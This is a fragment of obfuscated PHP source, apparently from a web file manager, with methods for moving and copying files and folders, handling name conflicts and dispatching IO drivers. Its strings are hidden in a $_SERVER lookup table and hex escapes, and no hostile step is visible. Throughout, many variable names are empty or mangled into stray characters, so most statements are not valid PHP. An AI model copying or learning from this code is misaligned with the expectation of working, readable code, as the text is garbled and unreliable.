$); Hook::trigger($—º[613], $’∑); Hook::trigger($—º[614], array($—º[615], $’∑, 0)); $ = $this->add($’∑); $»Å = array($—º[191] => $, $—º[42] => $); $this->_copyApplyMeta($»Å, $ÃÅ); if ($[$—º[462]] != $—º[98]) { $ÃÅ[$—º[606]][] = $[$—º[518]]; return $; } $ = array(); $ = array(); $this->_childrenListAll($√®, $); $Àà = count($); if ($Àà == 0) { return $; } $·Äî = $this->sourceInfo($); foreach ($ as $¬∂) { $ = $this->_makeItemData($¬∂, $·Äî, $¬∂[$—º[42]]); $[$—º[562]] = $¬∂[$—º[562]]; $[] = $; } $this->chunkEventSet($—º[616], array($—º[617], $’∑, $Àà)); $this->addAll($, array(), !1); $ = $this->where(array($—º[190] => $))->select(); $ = $this->_childrenMakeRelation($, $); $[$√®] = $; $ = array(); $ = array(); foreach ($ as $¬∂) { $ﬁ∑ = $¬∂[$—º[191]]; $œÑ = $this->_childrenMatch($, $¬∂, $·Äî); $[] = array($—º[191], $ﬁ∑, $—º[190], $œÑ[$—º[190]]); $[] = array($—º[191], $ﬁ∑, $—º[562], $œÑ[$—º[562]]); $this->_copyApplyMeta($¬∂, $ÃÅ); if ($¬∂[$—º[462]] != $—º[98]) { $ÃÅ[$—º[606]][] = $¬∂[$—º[518]]; } } $this->chunkEventSet($—º[618], array($—º[619], $’∑, $Àà)); $this->saveAll($); $this->chunkEventSet($—º[620], array($—º[621], $’∑, $Àà)); $this->saveAll($); return $; } private function _childrenMakeRelation($, $) { $ =& $_SERVER[]; $‘´ = array(); $ = array(); foreach ($ as $) { $ = $[$[42]] . $[18] . $[$[562]]; $‘´[$] = $[$[191]]; } foreach ($ as $) { $ = $[$[42]] . $[18] . $[$[562]]; $ = $‘´[$]; $[$] = $[$[191]]; } return $; } private function _childrenMatch($, $ËÖì, $Ã≥) { $Õ¶ =& $_SERVER[]; $ = $Ã≥[$Õ¶[562]]; $ = $this->parentLevelArray($ËÖì[$Õ¶[562]]); foreach ($ as $) { if (isset($[$])) { $ .= $[$] . $Õ¶[622]; } } $ = rtrim($, $Õ¶[60]) . $Õ¶[60]; $≈í = $this->parentLevelArray($); $Úì¥ü = $≈í[count($≈í) - 1]; return array($Õ¶[190] => $Úì¥ü, $Õ¶[562] => $); } private function _makeItemData($¬±, $€µ, $◊Ç»ô) { $ÿô =& $_SERVER[]; $∆π = array($ÿô[623] => $¬±[$ÿô[462]], $ÿô[471] => $◊Ç»ô, $ÿô[624] => $¬±[$ÿô[463]] ? $¬±[$ÿô[463]] : $ÿô[22], $ÿô[519] => $¬±[$ÿô[518]] ? $¬±[$ÿô[518]] : 0, $ÿô[594] => $¬±[$ÿô[86]] ? $¬±[$ÿô[86]] : 0, $ÿô[625] => intval($€µ[$ÿô[188]]), $ÿô[626] => intval($€µ[$ÿô[547]]), $ÿô[627] => intval(USER_ID), $ÿô[628] => intval(USER_ID), $ÿô[454] => intval($€µ[$ÿô[191]]), $ÿô[629] => $€µ[$ÿô[562]] . $€µ[$ÿô[191]] . $ÿô[60], $ÿô[475] => $¬±[$ÿô[95]] ? $¬±[$ÿô[95]] : time(), $ÿô[481] => 0, $ÿô[630] => $ÿô[22]); return $∆π; } private function _copyApplyMeta($, &$Ôå∑) { $ =& $_SERVER[]; $‘ú = $[$[191]]; $ÿº = $[$[42]]; if (!isset($[$[631]]) || !$[$[631]] || $[$[631]] == $[222]) { $Ôå∑[$[608]][] = array($[191], $‘ú, $[631], short_id($‘ú)); } if (Input::check($ÿº, $[632])) { $Ôå∑[$[607]][] = array($[191] => $‘ú, $[104] => $[515], $[427] => str_replace($[63], $[22], Pinyin::get($ÿº))); $Ôå∑[$[607]][] = array($[191] => $‘ú, $[104] => $[514], $[427] => Pinyin::get($ÿº, $[633])); } $Ôå∑[$[607]][] = array($[191] => $‘ú, $[104] => $[494], $[427] => KodSort::makeStr($ÿº)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($) { $Ô∂Ö =& $_SERVER[]; $ = $this->sourceInfo($); $ = $Ô∂Ö[634]; $ÿá = array($Ô∂Ö[562] => array($Ô∂Ö[589], $[$Ô∂Ö[562]] . $ . $Ô∂Ö[590]), $Ô∂Ö[482] => $this->targetIsDelete); $›û = $this->field($)->where($ÿá)->select(); if (!$›û) { return; } $›û = array_to_keyvalue($›û, $Ô∂Ö[191]); foreach ($›û as $”≥) { $€µ = $”≥[$Ô∂Ö[190]]; $ = $”≥[$Ô∂Ö[191]]; if (!isset($this->_childrenListCache[$]) && $”≥[$Ô∂Ö[462]] == $Ô∂Ö[98]) { $this->_childrenListCache[$] = array(); } if (!isset($this->_childrenListCache[$€µ])) { $this->_childrenListCache[$€µ] = array(); } $this->_childrenListCache[$€µ][$] = $”≥; $this->_childrenItemCache[$] = $”≥; } } private function _childrenListAll($, &$) { $≈Ø =& $_SERVER[]; if (!isset($this->_childrenListCache[$])) { return; } $Œ∏ = $this->_childrenListCache[$]; foreach ($Œ∏ as $Ôø∞ => $ƒÜÔ®ë) { $[$Ôø∞] = $ƒÜÔ®ë; if ($ƒÜÔ®ë[$≈Ø[462]] == $≈Ø[98]) { $this->_childrenListAll($Ôø∞, $); } } } private function sourceInfoCache($”úŸå) { if (isset($this->_childrenItemCache[$”úŸå])) { return $this->_childrenItemCache[$”úŸå]; } return $this->sourceInfo($”úŸå); } private function _childrenList($“Ä) { if (isset($this->_childrenListCache[$“Ä])) { return $this->_childrenListCache[$“Ä]; } return $this->_childrenListSelect($“Ä); } private function _childrenListSelect($≈π) { $ =& $_SERVER[]; $ = array($[190] => $≈π, $[482] => $this->targetIsDelete); $ = $this->where($)->select(); $ = $ ? $ : array(); $Â†Ü = array_to_keyvalue($, $[191]); $this->_childrenListCache[$≈π] = $Â†Ü; foreach ($Â†Ü as $≈π => $”¨) { $this->_childrenItemCache[$≈π] = $”¨; } return $Â†Ü; } private function fileNameExistAuto($, $∆£) { $’é =& $_SERVER[]; if ($∆£[$’é[482]] == $’é[98]) { return $this->fileNameExist($, $∆£[$’é[42]]); } return $this->fileNameExistCache($, $∆£[$’é[42]]); } private function fileNameExistCache($∆©, $) { $ =& $_SERVER[]; $ = strtolower($); $»∞ = $this->_childrenList($∆©); foreach ($»∞ as $) { if ($ == strtolower($[$[42]])) { return $[$[191]]; } } return !1; } private function fileNameAutoCache($, $, $Í§ì, $) { $ =& $_SERVER[]; $Í≥Ü“Ω = $this->_childrenList($); $ = array_to_keyvalue($Í≥Ü“Ω, $[22], $[42]); return $this->fileNameAutoGet($, $, $Í§ì, $); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($À∑, $‹ã, $ = REPEAT_REPLACE, $ = '') { $ =& $_SERVER[]; $ = $this->sourceInfo($À∑); $ = $this->sourceInfo($‹ã); if ($[$[190]] == $[$[191]]) { if ($[$[482]] == $[98]) { Model($[480])->restore(array($À∑)); } if (!$ || $ == $[$[42]]) { return $À∑; } } $ÕÄ = $this->pathInfoMore($À∑); if ($this->isParentOf($À∑, $‹ã)) { return !1; } if (!$ || !$ || $[$[462]] != $[98]) { return !1; } Hook::trigger($[635], $ÕÄ); $this->targetIsDelete = intval($[$[482]]); if ($[$[190]] == $‹ã && $ != $[$[42]]) { $ = $this->fileNameExist($‹ã, $); if ($ && $[$[462]] == $[222]) { $·§ï–£ = $this->sourceInfo($); $ = $this->fileHistory($·§ï–£, $[$[518]], $[$[86]]); if (!$) { Model($[521])->remove($[$[518]]); } $this->removeNow($À∑, !1); $this->folderSizeReset($‹ã); Hook::trigger($[636], $ÕÄ); return $; } } $‹Æ = $ ? $ : $[$[42]]; $this->lockMoveStart($À∑); $this->lockWriteStart($‹ã, $‹Æ); $–æ = array($[606] => array(), $[637] => !1); $this->clearShare($À∑, $‹ã); $Ÿä = $this->fileNameExistAuto($‹ã, $); $“©·ó´ = $this->_move($À∑, $‹ã, $, $–æ, $); $this->sourceCacheClear(); if ($[$[462]] == $[98] && $Ÿä) { $this->folderSizeResetChildren($“©·ó´); } Model($[224])->linkAdd($–æ[$[606]]); if ($Ÿä && $–æ[$[637]]) { $this->removeNow($À∑, !1); } $this->lockMoveEnd($À∑); $this->lockWriteEnd($‹ã, $‹Æ); $this->folderSizeReset($[$[190]]); $this->folderSizeReset($‹ã); $€∑ = array($[$[190]], $‹ã); if ($[$[462]] == $[98]) { $€∑[] = $À∑; } $this->updateModifyTime($€∑); Model($[610])->eventMove($À∑, $[$[190]], $‹ã); Hook::trigger($[636], $ÕÄ); return $“©·ó´; } private function _move($, $¬ê, $»è«è, &$, $«ú = '') { $Õ° =& $_SERVER[]; $‘´‘Ü = $this->sourceInfo($); $ = $‘´‘Ü[$Õ°[462]] == $Õ°[98]; $¬¢ = $«ú ? $«ú : $‘´‘Ü[$Õ°[42]]; $ê¢® = $this->fileNameExistAuto($¬ê, $‘´‘Ü); $this->lockMoveStart($); $this->lockWriteStart($¬ê, $¬¢); if (!$ê¢®) { return $this->_moveForce($, $¬ê, $¬¢); } $“ä = $ê¢®; $ = !1; if ($) { if ($»è«è == REPEAT_RENAME_FOLDER) { $¬¢ = $this->fileNameAuto($¬ê, $¬¢, $»è«è, $); $“ä = $this->_moveForce($, $¬ê, $¬¢); } else { if ($»è«è == REPEAT_RENAME_FOLDER) { $»è«è = REPEAT_RENAME; } $Œî = $this->_childrenListSelect($); foreach ($Œî as $) { $this->_move($[$Õ°[191]], $ê¢®, $»è«è, $); } $ = !0; } } else { if ($»è«è == REPEAT_SKIP) { $ = !0; } else { if ($»è«è == REPEAT_RENAME || $»è«è == REPEAT_RENAME_FOLDER) { $¬¢ = $this->fileNameAuto($¬ê, $¬¢, $»è«è, $); $“ä = $this->_moveForce($, $¬ê, $¬¢); } else { if ($»è«è == REPEAT_REPLACE) { $–© = $this->sourceInfoCache($ê¢®); $ = $this->fileHistory($–©, $‘´‘Ü[$Õ°[518]], $‘´‘Ü[$Õ°[86]]); $ = !0; if ($) { $[$Õ°[606]][] = $‘´‘Ü[$Õ°[518]]; } } } } } if ($ && !$[$Õ°[637]]) { $[$Õ°[637]] = !0; } return $“ä; } private function _moveForce($Ÿ∞, $⁄Ö, $Ë´Å) { $ =& $_SERVER[]; $ = $this->sourceInfo($Ÿ∞); $ = $this->sourceInfo($⁄Ö); $¬£ = $[$[462]] == $[98]; $ = array($[454] => $[$[191]], $[629] => $[$[562]] . $[$[191]] . $[60], $[625] => $[$[188]], $[626] => $[$[547]], $[628] => USER_ID, $[471] => $Ë´Å); $ = $[$[188]] == SourceModel::TYPE_GROUP && $[$[188]] == SourceModel::TYPE_GROUP && $[$[547]] == $[$[547]]; if (!$ && $this->moveClearAuth) { Model($[544])->authClear($Ÿ∞); } $Ÿó = $[$[482]] == $[98] && $[$[482]] != $[98]; if ($Ÿó) { $[$[481]] = 0; } if ($¬£) { $ = array($[629] => array($[589], $[$[562]] . $[$[191]] . $[590])); $ = $[$[562]] . $[$[191]] . $[60]; $Áúó = $[$[562]] . $[$[191]] . $[60] . $[$[191]] . $[60]; $Ìë® = array($[629] => array($[638], "\x72\145\160\154\141\143\x65\x28\160\x61\162\x65\x6e\x74\114\x65\x76\x65\x6c\54\x27{$}\x27\54\x27{$Áúó}\47\x29"), $[625] => $[$[188]], $[626] => $[$[547]]); if ($Ÿó) { $Ìë®[$[481]] = 0; } $this->where($)->data($Ìë®)->save(); } $this->where(array($[468] => $Ÿ∞))->data($)->save(); return $Ÿ∞; } private function clearShare($, $ÕáŒª) { $ =& $_SERVER[]; $ õ = $this->sourceInfo($); $ = $this->sourceInfo($ÕáŒª); if ($ õ[$[547]] == $[$[547]] && $ õ[$[188]] == $[639]) { return; } $–ç = array($[562] => array($[589], $ õ[$[562]] . $ . $[590])); $ﬂà = $this->field($[468])->where($–ç)->getField($[191], !0); if (!$ﬂà) { return; } $–ç = array($[191] => array($[17], $ﬂà), $[640] => 1); $–é = Model($[641])->field($[642])->where($–ç)->select(); if (!$–é) { return; } $–é = array_to_keyvalue($–é, $[22], $[642]); $–ç = array($[642] => array($[17], $–é)); Model($[641])->where($–ç)->save(array($[640] => 0)); Model($[643])->where($–ç)->delete(); } public function copyFolderFromIO($, $Ÿº, $, $…¢, $, $À™ = false) { $ƒö =& $_SERVER[]; $Àá = array($ƒö[607] => array(), $ƒö[608] => array(), $ƒö[606] => array(), $ƒö[644] => array()); $ = $À™ ? $À™ : $->pathThis($Ÿº); $∆¶ = $this->fileNameExist($, $); $ = $this->mkdir($, $, $…¢); if (!$∆¶ || $…¢ == REPEAT_RENAME_FOLDER) { $…¢ = !1; } if ($∆¶) { $this->_childrenAllMake($∆¶); } Hook::trigger($ƒö[645]); $this->_copyChildTo($, $Ÿº, $, $…¢, $Àá, $); Hook::trigger($ƒö[646]); if ($) { $this->folderSizeResetChildren($); } $this->_childrenListClear(); Model($ƒö[609])->addAll($Àá[$ƒö[607]], array(), !0); Model($ƒö[610])->eventCopy($); $this->saveAll($Àá[$ƒö[608]]); Model($ƒö[521])->linkAdd($Àá[$ƒö[606]]); Model($ƒö[521])->remove($Àá[$ƒö[644]]); $this->folderSizeReset($); $this->updateModifyTime($); return $; } private function _copyChildTo($”¥, $, $Ÿ®“è, $”î, &$√ñ–™, $) { $‡ß≠ =& $_SERVER[]; $ = $this->sourceInfoCache($Ÿ®“è); $›ú = $”¥->listPath($); $›ú = $›ú ? $›ú : array($‡ß≠[93] => array(), $‡ß≠[92] => array()); $ = array_merge($›ú[$‡ß≠[93]], $›ú[$‡ß≠[92]]); $ = $this->_addFiles($”¥, $›ú[$‡ß≠[93]], $); $ = array(); foreach ($ as &$»£) { if (isset($[$»£[$‡ß≠[42]]])) { $»£ = $[$»£[$‡ß≠[42]]]; } $»£[$‡ß≠[462]] = $»£[$‡ß≠[43]] == $‡ß≠[85]; $»£[$‡ß≠[463]] = substr(_get($»£, $‡ß≠[185], $‡ß≠[22]), 0, 10); $»£[$‡ß≠[86]] = _get($»£, $‡ß≠[86], 0); $»£[$‡ß≠[518]] = _get($»£, $‡ß≠[518], 0); if (!isset($»£[$‡ß≠[647]]) && $»£[$‡ß≠[518]]) { $√ñ–™[$‡ß≠[644]][] = $»£[$‡ß≠[518]]; } if ($”î) { $œ∫ = $this->fileNameExistCache($Ÿ®“è, $»£[$‡ß≠[42]]); if ($œ∫) { if ($»£[$‡ß≠[462]] || $”î == REPEAT_SKIP) { continue; } if ($”î == REPEAT_REPLACE) { $÷∫ = $this->sourceInfoCache($œ∫); $ = $this->fileHistory($÷∫, $»£[$‡ß≠[518]], $»£[$‡ß≠[86]]); if ($) { $√ñ–™[$‡ß≠[606]][] = $»£[$‡ß≠[518]]; } continue; } else { if ($”î == REPEAT_RENAME) { $»£[$‡ß≠[42]] = $this->fileNameAutoCache($Ÿ®“è, $»£[$‡ß≠[42]], $”î, !1); } } } } if (!$»£[$‡ß≠[462]] && $»£[$‡ß≠[518]] == 0) { continue; } if (!$»£[$‡ß≠[462]] && $»£[$‡ß≠[518]]) { $√ñ–™[$‡ß≠[606]][] = $»£[$‡ß≠[518]]; } $[] = $this->_makeItemData($»£, $, $»£[$‡ß≠[42]]); } unset($»£); if (!empty($)) { $this->addAll($); $this->_childrenListSelect($Ÿ®“è); } $ = $this->_childrenList($Ÿ®“è); $ = array_to_keyvalue($, $‡ß≠[42]); foreach ($ as $»£) { $÷∫ = $[$»£[$‡ß≠[42]]]; $¬é = $÷∫[$‡ß≠[191]]; $this->_copyApplyMeta($÷∫, $√ñ–™); if ($»£[$‡ß≠[43]] == $‡ß≠[85]) { $»£[$‡ß≠[94]] = $”¥->getPathInner($»£[$‡ß≠[94]]); $this->_copyChildTo($”¥, $»£[$‡ß≠[94]], $¬é, $”î, $√ñ–™, $); } } } private function _addFiles($, $À¨, $’™) { $ﬁ™≈© =& $_SERVER[]; if (!$À¨ || count($À¨) == 0) { return array(); } $ = array(); foreach ($À¨ as &$Í±∫) { Hook::trigger($ﬁ™≈©[648], $Í±∫); $Í±∫[$ﬁ™≈©[94]] = $->getPathInner($Í±∫[$ﬁ™≈©[94]]); $’ö = $->hashSimple($Í±∫[$ﬁ™≈©[94]]); $ = $->hashMd5($Í±∫[$ﬁ™≈©[94]]); if (strlen($) > 10 && !isset($[$])) { $[$] = array(); } $Í±∫[$ﬁ™≈©[649]] = $’ö; $Í±∫[$ﬁ™≈©[650]] = $; $[$][] =& $Í±∫; if (count($[$]) > 1) { $Í±∫[$ﬁ™≈©[647]] = !0; } Hook::trigger($ﬁ™≈©[651], $Í±∫); } unset($Í±∫); $‹∞ = array($ﬁ™≈©[650] => array($ﬁ™≈©[17], array_keys($))); $ = Model($ﬁ™≈©[652]); $ = $->where($‹∞)->select(); $ = $ ? $ : array(); foreach ($ as $À≠) { if (!isset($[$À≠[$ﬁ™≈©[650]]])) { continue; } $ = $[$À≠[$ﬁ™≈©[650]]]; foreach ($ as &$Í±∫) { $Í±∫[$ﬁ™≈©[518]] = $À≠[$ﬁ™≈©[518]]; $Í±∫[$ﬁ™≈©[647]] = !0; } unset($Í±∫); } $ = array(); foreach ($À¨ as $Óìπ) { Hook::trigger($ﬁ™≈©[653], $Óìπ); if (isset($Óìπ[$ﬁ™≈©[647]]) && $Óìπ[$ﬁ™≈©[647]]) { Hook::trigger($ﬁ™≈©[654], $Óìπ); continue; } $ﬂ≤ = $->getPathInner($Óìπ[$ﬁ™≈©[94]]); $Œ¶ = $->addFileMake($ﬂ≤, $Óìπ[$ﬁ™≈©[86]], $Óìπ[$ﬁ™≈©[649]], $Óìπ[$ﬁ™≈©[650]], $Óìπ[$ﬁ™≈©[42]], $’™); Hook::trigger($ﬁ™≈©[654], $Óìπ); if (!is_array($Œ¶)) { continue; } $[] = $Œ¶; } $->addAll($); $‹∞ = array($ﬁ™≈©[650] => array($ﬁ™≈©[17], array_keys($))); $ = $->where($‹∞)->select(); $ = $ ? $ : array(); foreach ($ as $À≠) { if (!isset($[$À≠[$ﬁ™≈©[650]]])) { continue; } $ =& $[$À≠[$ﬁ™≈©[650]]]; foreach ($ as &$Í±∫) { $Í±∫[$ﬁ™≈©[518]] = $À≠[$ﬁ™≈©[518]]; } unset($Í±∫); } $ ≤ = array(); foreach ($À¨ as $œ≥) { $ ≤[$œ≥[$ﬁ™≈©[42]]] = $œ≥; } return $ ≤; } } define($_SERVER[][655], $_SERVER[][656]); $wiljtgcdpa = $_SERVER[][657]; goto B; DÈ¢º: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($, $Ïì≤) { $ =& $_SERVER[]; $ = $Ïì≤; $GLOBALS[$[1187]] = $[1188] . $; Hook::trigger($[1188] . $ . $[1189], $); $ = self::driverMake($Ïì≤[0]); if (!$) { return !1; } if (method_exists($, $)) { $Ê∏ñ = @call_user_func_array(array($, $), $Ïì≤); } else { if (method_exists($, $[1190])) { $Ê∏ñ = @call_user_func_array(array($, $), $Ïì≤); } else { if (method_exists(self, $)) { $Ê∏ñ = @call_user_func_array(array(self, $), $Ïì≤); } else { $Ê∏ñ = call_user_func_array(array(parent, $), $Ïì≤); } } } Hook::trigger($[1188] . $ . $[1191], $, $Ê∏ñ); return $Ê∏ñ; } public static function init($÷õ‘õ’í) { return self::driverMake($÷õ‘õ’í); } public static function copy($, $Œì, $‰úï = false, $ = false) { return self::copyMoveStart($, $Œì, $‰úï, $_SERVER[][595], $); } public static function move($, $, $ = false, $Ÿê = false) { return self::copyMoveStart($, $, $, $_SERVER[][597], $Ÿê); } private static function copyMoveStart($·∂Ä, $’°, $≈Ω, $’ã, $) { $ =& $_SERVER[]; $ = array($·∂Ä, $’°, $≈Ω, $); Hook::trigger($[1188] . $’ã . $[1189], $); $ = self::copyMove($·∂Ä, $’°, $≈Ω, $’ã, $); Hook::trigger($[1188] . $’ã . $[1191], $, $); return $; } public static function saveFile($, $, $Âπª = true) { $Â≥ù =& $_SERVER[]; $ = self::info($); $«∞ = self::driverMake($); $‹≠Œµ = self::driverMake($); $ = !1; if ($‹≠Œµ->pathParse[$Â≥ù[1192]]) { $ = $‹≠Œµ; $ = $‹≠Œµ->pathParse[$Â≥ù[1192]]; $‹≠Œµ = self::driverMake($); } if ($«∞->pathParse[$Â≥ù[1192]]) { $ = $«∞->pathParse[$Â≥ù[1192]]; $«∞ = self::driverMake($); } $«Ö«Ñ = $‹≠Œµ->pathFather($); $÷† = !0; if (!$Âπª && self::driverIsSame($«∞, $‹≠Œµ)) { $÷† = !1; } $ = self::copyFile($«∞, $, $‹≠Œµ, $«Ö«Ñ, $[$Â≥ù[42]], $÷†); if ($) { $ = $->getPathOuter($); } return $; } private static function copyMove($, $, $, $œì, $Œò◊ô = false) { $ÀÑ =& $_SERVER[]; if (!$ || $ == $ÀÑ[18] || !$) { return !1; } ignore_timeout(); $ÿã = self::driverMake($); $ = self::driverMake($); $ = $œì == $ÀÑ[597]; $œá = !1; if ($->pathParse[$ÀÑ[1192]]) { $œá = $; $ = $->pathParse[$ÀÑ[1192]]; $ = self::driverMake($); } if ($ÿã->pathParse[$ÀÑ[1192]]) { $ = $ÿã->pathParse[$ÀÑ[1192]]; $ÿã = self::driverMake($); } self::check($ÿã, $, $, $); Hook::trigger($ÀÑ[1193], $ÿã, $, $, $); $ = self::driverIsSame($ÿã, $); if ($) { if ($œì == $ÀÑ[597] && !method_exists($, $ÀÑ[1194]) && trim($, $ÀÑ[18]) == trim($->pathFather($), $ÀÑ[18])) { if ($ÿã->pathThis($) != $Œò◊ô && !$ÿã->isTypeObject()) { return $ÿã->rename($, $Œò◊ô); } return $->getPathOuter($); } if (method_exists($, $œì)) { return $->{$œì}($, $, $, $Œò◊ô); } } if ($ && $œì == $ÀÑ[597] && $->getType() == $ÀÑ[116]) { $ƒì’ò = $->movePath($, $, $Œò◊ô); if ($ƒì’ò) { return $ƒì’ò; } } $»õ = $ÿã->isFile($); if (!$»õ && $->getType() == $ÀÑ[797] && $ÿã->getType() == $ÀÑ[116]) { $ƒì’ò = $->copyFolderFromIO($ÿã, $, $, $, $, $Œò◊ô); } else { $ƒì’ò = self::copyPath($ÿã, $, $, $, $, $, $»õ, $Œò◊ô); } if ($ƒì’ò && $) { $ÿã->remove($); } if ($œá) { $ƒì’ò = $œá->getPathOuter($ƒì’ò); } return $ƒì’ò; } private static function check($›©, $, $ƒÅﬂª, &$Ÿ™ ∏) { $◊≠ =& $_SERVER[]; if (self::driverIsSame($›©, $ƒÅﬂª) && $›©->isFolder($) && $›©->isParentOf($, $Ÿ™ ∏)) { show_json(LNG($◊≠[1195]), !1); } if (!$›©->exist($)) { show_json(LNG($◊≠[115]), !1); } } private static function copyPath($, $»∫, $, $, $≈•»è, $Œß, $, $‘ú = false, $ = true) { $ =& $_SERVER[]; $À∞ = empty($‘ú) && $‘ú !== $[222] ? $->pathThis($»∫) : $‘ú; if ($≈•»è) { $¬• = $->fileNameExist($, $À∞); $Ÿé = $À∞; $À∞ = $->fileNameAuto($, $À∞, $≈•»è, !$); if (!$¬• || $Ÿé != $À∞) { $≈•»è = !1; } if ($ && !$≈•»è) { $->_data[$[1196]] = !0; } } if ($) { return self::copyFile($, $»∫, $, $, $À∞, $Œß); } if ($≈•»è == REPEAT_RENAME_FOLDER) { $≈•»è = !1; } $ = rtrim($, $[18]) . $[18] . $À∞; $ = $->mkdir($->getPath($), $≈•»è); $ = $->getPathInner($); $ = $->listPath($»∫, !0); $ = is_array($) ? $ : array($[93] => array(), $[92] => array()); $Ÿå = array_merge($[$[93]], $[$[92]]); foreach ($Ÿå as $÷•Ûè≠¢) { $ = $÷•Ûè≠¢[$[43]] == $[224]; $»∫ = $->getPathInner($÷•Ûè≠¢[$[94]]); $ƒÜ = self::copyPath($, $»∫, $, $, $≈•»è, $Œß, $, !1, !1); if (!$ƒÜ) { IO::errorTips($[1197] . $»∫ . $[80] . $); } } self::copyMoveKeepInfo($, $»∫, $); return $; } private static function copyFile($Êêô, $–ê, $…ã⁄°, $◊±, $ÓòÄ, $÷´) { $—à =& $_SERVER[]; $◊± = $…ã⁄°->getPath(rtrim($◊±, $—à[18]) . $—à[18] . $ÓòÄ); $»ä = $—à[1198] . time() . rand_string(5); Hook::trigger($—à[1199], $Êêô, $–ê, $…ã⁄°, $◊±, $ÓòÄ, $»ä); if (self::driverIsSame($Êêô, $…ã⁄°)) { if ($÷´) { $ƒÜ = $…ã⁄°->moveFile($–ê, $◊±); } else { $ƒÜ = $…ã⁄°->copyFile($–ê, $◊±); } Hook::trigger($—à[1200], $Êêô, $–ê, $…ã⁄°, $◊±, $ÓòÄ, $ƒÜ); self::copyMoveKeepInfo($Êêô, $–ê, $ƒÜ); return $ƒÜ; } $€≠ = TEMP_FILES; if ($GLOBALS[$—à[16]][$—à[99]][$—à[836]]) { $€≠ = $GLOBALS[$—à[16]][$—à[99]][$—à[836]]; } $›Ä = $€≠; mk_dir($›Ä); $ = $›Ä . $»ä; $‚¥¨ = $; $ = $Êêô->download($–ê, $); $ = $Êêô->iconvApp($); if (substr($, strlen($€≠)) == $€≠) { $÷´ = !0; } $ƒÜ = $…ã⁄°->upload($◊±, $, $÷´); self::remove($‚¥¨); Hook::trigger($—à[1200], $Êêô, $–ê, $…ã⁄°, $◊±, $ÓòÄ, $ƒÜ); self::copyMoveKeepInfo($Êêô, $–ê, $ƒÜ); return $ƒÜ; } private static function copyMoveKeepInfo($, $, $–Ç) { if (!$–Ç) { return; } $◊± = $->info($); if (!is_array($◊±)) { return; } IO::setModifyTime($–Ç, $◊±[$_SERVER[][95]]); } public static function pathFather($Ëí£) { $ﬂ¥⁄ñ = IO::init($Ëí£); $◊é = $ﬂ¥⁄ñ->pathFather($ﬂ¥⁄ñ->path); return $ﬂ¥⁄ñ->getPathOuter($◊é); } public static function fileOut($, $…á√ò = false, $ = false, $Ó®ê = '') { $ = self::driverMake($); if ($->isFileOutServer()) { return $->fileOutServer($, $…á√ò, $, $Ó®ê); } return $->fileOut($, $…á√ò, $, $Ó®ê); } public static function fileOutImage($, $ = 250) { $≈Ø = array(250, 600, 1200, 2000, 3000, 5000); for ($…ó÷Ø = 0; $…ó÷Ø < count($≈Ø); $…ó÷Ø++) { if ($…ó÷Ø == 0 && $ <= $≈Ø[$…ó÷Ø]) { $ = $≈Ø[$…ó÷Ø]; break; } else { if ($ > $≈Ø[$…ó÷Ø - 1] && $ <= $≈Ø[$…ó÷Ø]) { $ = $≈Ø[$…ó÷Ø]; break; } else { if ($…ó÷Ø == count($≈Ø) - 1 && $ > $≈Ø[$…ó÷Ø]) { $ = $≈Ø[$…ó÷Ø]; break; } } } } $ÂàÖ = self::driverMake($); if ($ÂàÖ->isFileOutServer()) { return $ÂàÖ->fileOutImageServer($, $); } return $ÂàÖ->fileOutImage($, $); } private static function driverIsSame($ƒ∏›ò, $…è) { $”¶ =& $_SERVER[]; $ = $ƒ∏›ò->getType(); $ﬁ´ = $…è->getType(); if ($ != $ﬁ´) { return !1; } if ($ == $”¶[797]) { return !0; } if ($ == $”¶[116]) { return !0; } if ($ƒ∏›ò->pathDriver == $…è->pathDriver) { return !0; } return !1; } public static function copyUpdate($≈ã, $ÿÇ) { $À£ =& $_SERVER[]; if (!IO::exist($≈ã)) { return !1; } if (!IO::exist($ÿÇ)) { IO::mkdir($ÿÇ); } $·Ç´ = array_to_keyvalue(self::listAllSimple($≈ã), $À£[94]); $ = array_to_keyvalue(self::listAllSimple($ÿÇ), $À£[94]); $ = array(); $Ëú≤ = array(); foreach ($·Ç´ as $Ìåµ => $) { if (isset($[$Ìåµ])) { if ($[$À£[85]] == 1) { continue; } if ($[$Ìåµ][$À£[86]] == $[$À£[86]]) { continue; } } if ($[$À£[85]] == 1) { $Ëú≤[] = $ÿÇ . $À£[18] . trim($Ìåµ, $À£[18]); continue; } $«ú = strstr(trim($Ìåµ, $À£[18]), $À£[18]) ? get_path_father($Ìåµ) : $À£[22]; $[] = array($À£[1201] => $[$À£[96]], $À£[1202] => rtrim($ÿÇ, $À£[18]) . $À£[18] . $«ú, $À£[1203] => $); } $ î = array($À£[224] => $, $À£[85] => $Ëú≤); Hook::trigger($À£[1204], $≈ã, $ÿÇ, $ î); foreach ($Ëú≤ as $) { IO::mkdir($); } foreach ($ as $) { IO::copy($[$À£[1201]], $[$À£[1202]], REPEAT_REPLACE); } } public static function fileSubstr($Ÿú, $ÙÉã´, $ = false) { $ =& $_SERVER[]; $∆≥ = self::driverMake($Ÿú); $ = $∆≥->size($Ÿú); $ÿä = $ÙÉã´; $⁄ï = $; if ($ÙÉã´ < 0) { $ÙÉã´ = $ + $ÙÉã´; } if ($ === !1) { $ = $ - $ÙÉã´; } if ($ÙÉã´ + $ > $) { $ = $ - $ÙÉã´; } if (!$ && $∆≥->getType() == $[116] && !$∆≥->exist($Ÿú)) { $ = get_path_this($Ÿú); $ = parse_url_query($); if (is_array($) && isset($[$[42]])) { $ = urldecode($[$[42]]); } throw new Exception($[1205] . LNG($[1206]) . $[1007] . clear_html($) . $[22]); } if ($ <= 0) { return $[22]; } if ($ÙÉã´ < 0 || $ÙÉã´ >= $ || $ > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\145\x52\145\x61\144\40\x65\x72\162\x6f\162\41\x20\x73\164\141\x72\164\x3d{$ÙÉã´}\x3b\x6c\x65\x6e\x67\164\150\75{$}\x3b\x20\163\x69\172\145\75{$}\73"); } $ÎÄî = $∆≥->fileSubstr($Ÿú, $ÙÉã´, $); if (!$ÎÄî && $ && isset($GLOBALS[$[1207]])) { throw new Exception($GLOBALS[$[1207]][$[1208]]); } return $ÎÄî; } private static function driverMake(&$Ã∂) { $ÃÄ =& $_SERVER[]; $Î¢Ö = 